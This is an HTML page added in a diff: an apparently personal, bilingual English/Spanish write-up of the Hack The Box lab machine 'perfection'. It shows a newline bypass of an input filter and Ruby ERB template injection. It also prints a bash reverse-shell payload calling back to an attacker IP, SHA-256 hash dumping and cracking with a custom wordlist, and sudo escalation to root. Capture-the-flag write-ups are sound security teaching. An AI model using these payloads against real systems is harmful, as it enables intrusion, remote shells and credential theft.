@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>perfection | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">perfection</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Ruby web application built with the Sinatra framework and WEBrick server. The application featured a weighted grade calculator that reflected user input back to the page, making it a potential target for Server-Side Template Injection (SSTI).</p>
+                    
+                    <p>Initial attempts at SSTI were blocked by input validation that filtered special characters like quotes, backticks, and other injection-related symbols. However, I discovered that this filter could be bypassed using a newline character (<code>%0a</code> in URL encoding) before the malicious payload, allowing me to inject Ruby ERB template code that executed arbitrary commands on the server.</p>
+                    
+                    <p>After gaining initial access as the <code>susan</code> user through the SSTI vulnerability, I found a SQLite database containing password hashes. An email discovered in <code>/var/mail/susan</code> revealed the password format specification used by the organization. Using this information, I generated a custom wordlist based on the pattern and successfully cracked Susan's password hash, which granted me full <code>sudo</code> privileges to escalate to root.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Ruby ERB Server-Side Template Injection (SSTI), newline character input validation bypass, custom wordlist generation, SHA-256 hash cracking with hashcat.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image6.png"
+                        alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" />
+                </p>
+
+                <p>The scan reveals two open ports: SSH on port 22 and HTTP on port 80. The web server is running WEBrick 1.7.0 with Ruby 3.0.2, which provides valuable information about the underlying technology stack.</p>
+
+                <h2>Web Application Enumeration</h2>
+                <p>Navigating to the web application on port 80, I find a weighted grade calculator application. This functionality allows users to input different course categories with their corresponding grades and weights to calculate an overall weighted average:</p>
+                <p><img src="./media/image7.png"
+                        alt="Weighted grade calculator web interface showing input fields for categories, grades, and weights" />
+                </p>
+
+                <h3>Analyzing HTTP Requests</h3>
+                <p>When the form is submitted, the application processes a POST request with the following structure:</p>
+                <p><img src="./media/image5.png"
+                        alt="HTTP POST request showing the form data being sent to the weighted-grade-calc endpoint" />
+                </p>
+
+                <p>The application reflects the calculation results back to the user in the response page. This reflection behavior immediately suggests the potential for injection attacks, particularly Server-Side Template Injection (SSTI) since the application is using Ruby.</p>
+
+                <h3>Identifying Input Validation</h3>
+                <p>When attempting to inject special characters like single quotes (<code>'</code>) or other typical injection characters, the application returns an error message in the HTML output:</p>
+                <pre><code class="language-plaintext">Malicious input blocked</code></pre>
+
+                <p>To systematically identify which characters are being blocked by the input validation, I use <code>ffuf</code> to fuzz the input parameters:</p>
+                <pre><code class="language-bash">ffuf -u http://10.10.11.253/weighted-grade-calc \
+  -d 'category1=FUZZ&grade1=80&weight1=25&category2=Literature&grade2=100&weight2=55&category3=Physics&grade3=93&weight3=20&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0' \
+  -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt \
+  -mr Malicious</code></pre>
+
+                <p>This command fuzzes the <code>category1</code> parameter while filtering responses that contain the word "Malicious", which indicates blocked input:</p>
+                <p><img src="./media/image2.png"
+                        alt="Ffuf results showing which special characters trigger the malicious input filter" />
+                </p>
+
+                <p>The fuzzing reveals that characters commonly used in injection attacks—such as quotes, backticks, angle brackets, and others—are all being filtered.</p>
+
+                <h3>Technology Stack Identification</h3>
+                <p>Running <code>whatweb</code> provides additional information about the technology stack:</p>
+                <pre><code class="language-plaintext">http://10.10.11.253 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)], 
+IP[10.10.11.253], PoweredBy[WEBrick], Ruby[3.0.2], Script, Title[Weighted Grade Calculator], 
+UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]</code></pre>
+
+                <p>Visiting a non-existent page to trigger a 404 error provides further confirmation:</p>
+                <p><img src="./media/image3.png"
+                        alt="404 error page showing Sinatra framework branding and error details" />
+                </p>
+
+                <p>The 404 page clearly identifies the application as being built with <strong>Sinatra</strong>, a lightweight Ruby web framework. This confirms that the application is likely using ERB (Embedded Ruby) templates, making it a prime target for SSTI attacks.</p>
+
+                <h2>Server-Side Template Injection (SSTI)</h2>
+                <p>Knowing that the application uses Ruby and reflects user input, I begin testing for SSTI vulnerabilities using payloads from the PayloadsAllTheThings repository: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md">Ruby SSTI Payloads</a>.</p>
+
+                <p>However, all standard SSTI payloads fail because the input validation blocks the necessary special characters. I need to find a way to bypass this filter.</p>
+
+                <h3>Newline Character Bypass</h3>
+                <p>After experimenting with various encoding techniques, I discover that using a newline character (<code>%0a</code> in URL encoding) before the payload bypasses the input validation filter. Testing this with a simple quote injection:</p>
+                <pre><code class="language-plaintext">category5=a%0a'</code></pre>
+
+                <p><img src="./media/image4.png"
+                        alt="Response showing that the newline bypass allows special characters through the filter" />
+                </p>
+
+                <p>The newline character successfully bypasses the filter! This works because the validation logic likely checks each line independently, and by starting a new line, the malicious characters are no longer detected by the filter.</p>
+
+                <h3>Confirming SSTI Vulnerability</h3>
+                <p>With the bypass technique confirmed, I test a basic ERB template injection to verify SSTI. The ERB syntax uses <code>&lt;%= %&gt;</code> tags to execute Ruby code. I craft the following payload to test mathematical evaluation:</p>
+                <pre><code class="language-plaintext">category1=N%2FA&grade1=0&weight1=0&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=a%0a<%25%3d+7+*+7+%25>&grade5=1&weight5=100</code></pre>
+
+                <p>Breaking down the payload:</p>
+                <ul>
+                    <li><code>category5=a%0a</code> - Sets the category to "a" followed by a newline to bypass the filter</li>
+                    <li><code><%25%3d+7+*+7+%25></code> - URL-encoded ERB template syntax: <code>&lt;%= 7 * 7 %&gt;</code></li>
+                </ul>
+
+                <p><img src="./media/image1.png"
+                        alt="Application response showing the result of 49, confirming successful SSTI execution" />
+                </p>
+
+                <p>The application returns <strong>49</strong> (7 × 7), confirming successful Server-Side Template Injection! The Ruby code is being executed on the server, and the result is reflected in the response.</p>
+
+                <h2>Initial Access - Exploiting SSTI for Remote Code Execution</h2>
+                <p>Now that I've confirmed SSTI, I can leverage it to execute arbitrary system commands and obtain a reverse shell. In ERB templates, backticks can be used to execute shell commands. I craft the following payload:</p>
+                <pre><code class="language-plaintext">category1=N%2FA&grade1=0&weight1=0&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=a%0a<%25%3d+`bash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.2/443+0>%261"`+%25>&grade5=1&weight5=100</code></pre>
+
+                <p>This payload URL-decodes to:</p>
+                <pre><code class="language-ruby"><%= `bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"` %></code></pre>
+
+                <p>The payload executes a bash reverse shell that connects back to my attacking machine on port 443.</p>
+
+                <p>Before sending the payload, I set up a netcat listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>After submitting the malicious request, I successfully receive a reverse shell connection as the <code>susan</code> user and can retrieve the user flag.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After gaining access as <code>susan</code>, I begin enumerating the system for privilege escalation vectors. In Susan's home directory, I discover a <code>Migration</code> folder containing an interesting SQLite database:</p>
+                <pre><code class="language-bash">susan@perfection:~$ sqlite3 Migration/pupilpath_credentials.db</code></pre>
+
+                <p>Examining the database structure and contents:</p>
+                <pre><code class="language-sql">SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> .tables
+users
+sqlite> select * from users;
+1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
+3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
+4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
+5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8</code></pre>
+
+                <p>The database contains five user accounts with what appear to be SHA-256 password hashes (64 hexadecimal characters). I attempt to crack these hashes using <code>hashcat</code> with mode 1400 (SHA-256) and the rockyou wordlist, but none of the hashes crack with this approach.</p>
+
+                <h3>Discovering the Password Format</h3>
+                <p>Checking for mail in <code>/var/mail/susan</code>, I discover a highly valuable email from Tina Smith:</p>
+                <pre><code class="language-plaintext">susan@perfection:~/Migration$ cat /var/mail/susan
+
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate 
+our credentials ('our' including the other students in our class) to the new platform. I also suggest a new 
+password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be converted into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student</code></pre>
+
+                <p>This email reveals the exact password format being used! For Susan Miller, the password would follow the pattern:</p>
+                <pre><code class="language-plaintext">susan_nasus_{random_integer}</code></pre>
+
+                <p>Where the random integer is between 1 and 1,000,000,000.</p>
+
+                <h2>Privilege Escalation - Password Cracking with Custom Wordlist</h2>
+                <p>With the password format known, I can generate a custom wordlist containing all possible password combinations for Susan. I create a Python script to generate this wordlist efficiently:</p>
+                <pre><code class="language-python">with open("susan_nasus.txt", "w") as f:
+    batch = []
+    for i in range(1, 1_000_000_001):
+        batch.append(f"susan_nasus_{i}\n")
+        if i % 1000000 == 0:  # write every 1 million lines
+            f.writelines(batch)
+            batch = []
+    f.writelines(batch)</code></pre>
+
+                <p>This script generates a wordlist with one billion entries, each following the required password format. The batch writing approach ensures efficient memory usage by writing to disk periodically rather than storing everything in memory.</p>
+
+                <p>I then use <code>hashcat</code> to crack Susan's password hash using the custom wordlist:</p>
+                <pre><code class="language-bash">hashcat -m 1400 -a 0 susan_hash.txt susan_nasus.txt</code></pre>
+
+                <p>After some time, hashcat successfully cracks the password:</p>
+                <pre><code class="language-plaintext">abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210</code></pre>
+
+                <p>The password is <code>susan_nasus_413759210</code>.</p>
+
+                <h3>Sudo Privileges and Root Access</h3>
+                <p>With Susan's password, I check her sudo privileges:</p>
+                <pre><code class="language-bash">susan@perfection:~/Migration$ sudo -l
+[sudo] password for susan: 
+Matching Defaults entries for susan on perfection:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User susan may run the following commands on perfection:
+    (ALL : ALL) ALL</code></pre>
+
+                <p>Susan has full sudo privileges to run any command as any user! This makes privilege escalation trivial:</p>
+                <pre><code class="language-bash">susan@perfection:~/Migration$ sudo su
+root@perfection:/home/susan/Migration# cat /root/root.txt</code></pre>
+
+                <p>I now have root access and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web Ruby construida con el framework Sinatra y el servidor WEBrick. La aplicación presentaba una calculadora de notas ponderadas que reflejaba la entrada del usuario en la página, convirtiéndola en un objetivo potencial para Server-Side Template Injection (SSTI).</p>
+                    
+                    <p>Los intentos iniciales de SSTI fueron bloqueados por una validación de entrada que filtraba caracteres especiales como comillas, backticks y otros símbolos relacionados con inyecciones. Sin embargo, descubrí que este filtro podía eludirse usando un carácter de nueva línea (<code>%0a</code> en codificación URL) antes del payload malicioso, permitiéndome inyectar código de plantilla Ruby ERB que ejecutaba comandos arbitrarios en el servidor.</p>
+                    
+                    <p>Tras conseguir acceso inicial como usuario <code>susan</code> mediante la vulnerabilidad SSTI, encontré una base de datos SQLite que contenía hashes de contraseñas. Un correo electrónico descubierto en <code>/var/mail/susan</code> reveló la especificación del formato de contraseña usado por la organización. Utilizando esta información, generé un diccionario personalizado basado en el patrón y conseguí crackear exitosamente el hash de la contraseña de Susan, lo que me otorgó privilegios completos de <code>sudo</code> para escalar a root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Server-Side Template Injection (SSTI) de Ruby ERB, bypass de validación de entrada mediante carácter de nueva línea, generación de diccionario personalizado, crackeo de hash SHA-256 con hashcat.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image6.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" />
+                </p>
+
+                <p>El escaneo revela dos puertos abiertos: SSH en el puerto 22 y HTTP en el puerto 80. El servidor web ejecuta WEBrick 1.7.0 con Ruby 3.0.2, lo que proporciona información valiosa sobre la pila tecnológica subyacente.</p>
+
+                <h2>Enumeración de la Aplicación Web</h2>
+                <p>Navegando a la aplicación web en el puerto 80, encuentro una aplicación de calculadora de notas ponderadas. Esta funcionalidad permite a los usuarios introducir diferentes categorías de cursos con sus correspondientes notas y pesos para calcular un promedio ponderado general:</p>
+                <p><img src="./media/image7.png"
+                        alt="Interfaz web de la calculadora de notas ponderadas mostrando campos de entrada para categorías, notas y pesos" />
+                </p>
+
+                <h3>Analizando las Peticiones HTTP</h3>
+                <p>Cuando se envía el formulario, la aplicación procesa una petición POST con la siguiente estructura:</p>
+                <p><img src="./media/image5.png"
+                        alt="Petición HTTP POST mostrando los datos del formulario siendo enviados al endpoint weighted-grade-calc" />
+                </p>
+
+                <p>La aplicación refleja los resultados del cálculo al usuario en la página de respuesta. Este comportamiento de reflexión sugiere inmediatamente el potencial para ataques de inyección, particularmente Server-Side Template Injection (SSTI) ya que la aplicación usa Ruby.</p>
+
+                <h3>Identificando la Validación de Entrada</h3>
+                <p>Al intentar inyectar caracteres especiales como comillas simples (<code>'</code>) u otros caracteres típicos de inyección, la aplicación devuelve un mensaje de error en la salida HTML:</p>
+                <pre><code class="language-plaintext">Malicious input blocked</code></pre>
+
+                <p>Para identificar sistemáticamente qué caracteres están siendo bloqueados por la validación de entrada, uso <code>ffuf</code> para hacer fuzzing de los parámetros de entrada:</p>
+                <pre><code class="language-bash">ffuf -u http://10.10.11.253/weighted-grade-calc \
+  -d 'category1=FUZZ&grade1=80&weight1=25&category2=Literature&grade2=100&weight2=55&category3=Physics&grade3=93&weight3=20&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0' \
+  -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt \
+  -mr Malicious</code></pre>
+
+                <p>Este comando hace fuzzing del parámetro <code>category1</code> mientras filtra las respuestas que contienen la palabra "Malicious", lo que indica entrada bloqueada:</p>
+                <p><img src="./media/image2.png"
+                        alt="Resultados de ffuf mostrando qué caracteres especiales activan el filtro de entrada maliciosa" />
+                </p>
+
+                <p>El fuzzing revela que los caracteres comúnmente usados en ataques de inyección —como comillas, backticks, corchetes angulares y otros— están todos siendo filtrados.</p>
+
+                <h3>Identificación de la Pila Tecnológica</h3>
+                <p>Ejecutar <code>whatweb</code> proporciona información adicional sobre la pila tecnológica:</p>
+                <pre><code class="language-plaintext">http://10.10.11.253 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)], 
+IP[10.10.11.253], PoweredBy[WEBrick], Ruby[3.0.2], Script, Title[Weighted Grade Calculator], 
+UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]</code></pre>
+
+                <p>Visitando una página inexistente para provocar un error 404 proporciona confirmación adicional:</p>
+                <p><img src="./media/image3.png"
+                        alt="Página de error 404 mostrando la marca del framework Sinatra y detalles del error" />
+                </p>
+
+                <p>La página 404 identifica claramente la aplicación como construida con <strong>Sinatra</strong>, un framework web ligero de Ruby. Esto confirma que la aplicación probablemente usa plantillas ERB (Embedded Ruby), convirtiéndola en un objetivo principal para ataques SSTI.</p>
+
+                <h2>Server-Side Template Injection (SSTI)</h2>
+                <p>Sabiendo que la aplicación usa Ruby y refleja la entrada del usuario, comienzo a probar vulnerabilidades SSTI usando payloads del repositorio PayloadsAllTheThings: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md">Ruby SSTI Payloads</a>.</p>
+
+                <p>Sin embargo, todos los payloads SSTI estándar fallan porque la validación de entrada bloquea los caracteres especiales necesarios. Necesito encontrar una forma de eludir este filtro.</p>
+
+                <h3>Bypass con Carácter de Nueva Línea</h3>
+                <p>Tras experimentar con varias técnicas de codificación, descubro que usar un carácter de nueva línea (<code>%0a</code> en codificación URL) antes del payload elude el filtro de validación de entrada. Probando esto con una simple inyección de comilla:</p>
+                <pre><code class="language-plaintext">category5=a%0a'</code></pre>
+
+                <p><img src="./media/image4.png"
+                        alt="Respuesta mostrando que el bypass de nueva línea permite que los caracteres especiales pasen a través del filtro" />
+                </p>
+
+                <p>¡El carácter de nueva línea elude exitosamente el filtro! Esto funciona porque la lógica de validación probablemente verifica cada línea independientemente, y al iniciar una nueva línea, los caracteres maliciosos ya no son detectados por el filtro.</p>
+
+                <h3>Confirmando la Vulnerabilidad SSTI</h3>
+                <p>Con la técnica de bypass confirmada, pruebo una inyección básica de plantilla ERB para verificar SSTI. La sintaxis ERB usa etiquetas <code>&lt;%= %&gt;</code> para ejecutar código Ruby. Diseño el siguiente payload para probar la evaluación matemática:</p>
+                <pre><code class="language-plaintext">category1=N%2FA&grade1=0&weight1=0&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=a%0a<%25%3d+7+*+7+%25>&grade5=1&weight5=100</code></pre>
+
+                <p>Desglosando el payload:</p>
+                <ul>
+                    <li><code>category5=a%0a</code> - Establece la categoría a "a" seguido de una nueva línea para eludir el filtro</li>
+                    <li><code><%25%3d+7+*+7+%25></code> - Sintaxis de plantilla ERB codificada en URL: <code>&lt;%= 7 * 7 %&gt;</code></li>
+                </ul>
+
+                <p><img src="./media/image1.png"
+                        alt="Respuesta de la aplicación mostrando el resultado de 49, confirmando la ejecución exitosa de SSTI" />
+                </p>
+
+                <p>¡La aplicación devuelve <strong>49</strong> (7 × 7), confirmando Server-Side Template Injection exitoso! El código Ruby se está ejecutando en el servidor, y el resultado se refleja en la respuesta.</p>
+
+                <h2>Acceso Inicial - Explotando SSTI para Ejecución Remota de Código</h2>
+                <p>Ahora que he confirmado SSTI, puedo aprovecharlo para ejecutar comandos de sistema arbitrarios y obtener una reverse shell. En las plantillas ERB, los backticks pueden usarse para ejecutar comandos de shell. Diseño el siguiente payload:</p>
+                <pre><code class="language-plaintext">category1=N%2FA&grade1=0&weight1=0&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=a%0a<%25%3d+`bash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.2/443+0>%261"`+%25>&grade5=1&weight5=100</code></pre>
+
+                <p>Este payload se decodifica a:</p>
+                <pre><code class="language-ruby"><%= `bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"` %></code></pre>
+
+                <p>El payload ejecuta una reverse shell bash que conecta de vuelta a mi máquina atacante en el puerto 443.</p>
+
+                <p>Antes de enviar el payload, configuro un listener de netcat:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Tras enviar la petición maliciosa, recibo exitosamente una conexión de reverse shell como usuario <code>susan</code> y puedo recuperar la flag de usuario.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Tras obtener acceso como <code>susan</code>, comienzo a enumerar el sistema en busca de vectores de escalada de privilegios. En el directorio home de Susan, descubro una carpeta <code>Migration</code> que contiene una base de datos SQLite interesante:</p>
+                <pre><code class="language-bash">susan@perfection:~$ sqlite3 Migration/pupilpath_credentials.db</code></pre>
+
+                <p>Examinando la estructura y contenidos de la base de datos:</p>
+                <pre><code class="language-sql">SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> .tables
+users
+sqlite> select * from users;
+1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
+3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
+4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
+5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8</code></pre>
+
+                <p>La base de datos contiene cinco cuentas de usuario con lo que parecen ser hashes de contraseña SHA-256 (64 caracteres hexadecimales). Intento crackear estos hashes usando <code>hashcat</code> con modo 1400 (SHA-256) y el diccionario rockyou, pero ninguno de los hashes se crackea con este enfoque.</p>
+
+                <h3>Descubriendo el Formato de Contraseña</h3>
+                <p>Verificando el correo en <code>/var/mail/susan</code>, descubro un correo electrónico altamente valioso de Tina Smith:</p>
+                <pre><code class="language-plaintext">susan@perfection:~/Migration$ cat /var/mail/susan
+
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate 
+our credentials ('our' including the other students in our class) to the new platform. I also suggest a new 
+password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be converted into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student</code></pre>
+
+                <p>¡Este correo electrónico revela el formato exacto de contraseña que se está usando! Para Susan Miller, la contraseña seguiría el patrón:</p>
+                <pre><code class="language-plaintext">susan_nasus_{entero_aleatorio}</code></pre>
+
+                <p>Donde el entero aleatorio está entre 1 y 1.000.000.000.</p>
+
+                <h2>Escalada de Privilegios - Crackeo de Contraseña con Diccionario Personalizado</h2>
+                <p>Con el formato de contraseña conocido, puedo generar un diccionario personalizado conteniendo todas las combinaciones posibles de contraseña para Susan. Creo un script de Python para generar este diccionario eficientemente:</p>
+                <pre><code class="language-python">with open("susan_nasus.txt", "w") as f:
+    batch = []
+    for i in range(1, 1_000_000_001):
+        batch.append(f"susan_nasus_{i}\n")
+        if i % 1000000 == 0:  # escribir cada millón de líneas
+            f.writelines(batch)
+            batch = []
+    f.writelines(batch)</code></pre>
+
+                <p>Este script genera un diccionario con mil millones de entradas, cada una siguiendo el formato de contraseña requerido. El enfoque de escritura por lotes asegura un uso eficiente de memoria escribiendo periódicamente a disco en lugar de almacenar todo en memoria.</p>
+
+                <p>Luego uso <code>hashcat</code> para crackear el hash de contraseña de Susan usando el diccionario personalizado:</p>
+                <pre><code class="language-bash">hashcat -m 1400 -a 0 susan_hash.txt susan_nasus.txt</code></pre>
+
+                <p>Después de algún tiempo, hashcat crackea exitosamente la contraseña:</p>
+                <pre><code class="language-plaintext">abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210</code></pre>
+
+                <p>La contraseña es <code>susan_nasus_413759210</code>.</p>
+
+                <h3>Privilegios Sudo y Acceso Root</h3>
+                <p>Con la contraseña de Susan, verifico sus privilegios sudo:</p>
+                <pre><code class="language-bash">susan@perfection:~/Migration$ sudo -l
+[sudo] password for susan: 
+Matching Defaults entries for susan on perfection:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User susan may run the following commands on perfection:
+    (ALL : ALL) ALL</code></pre>
+
+                <p>¡Susan tiene privilegios sudo completos para ejecutar cualquier comando como cualquier usuario! Esto hace que la escalada de privilegios sea trivial:</p>
+                <pre><code class="language-bash">susan@perfection:~/Migration$ sudo su
+root@perfection:/home/susan/Migration# cat /root/root.txt</code></pre>
+
+                <p>Ahora tengo acceso root y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
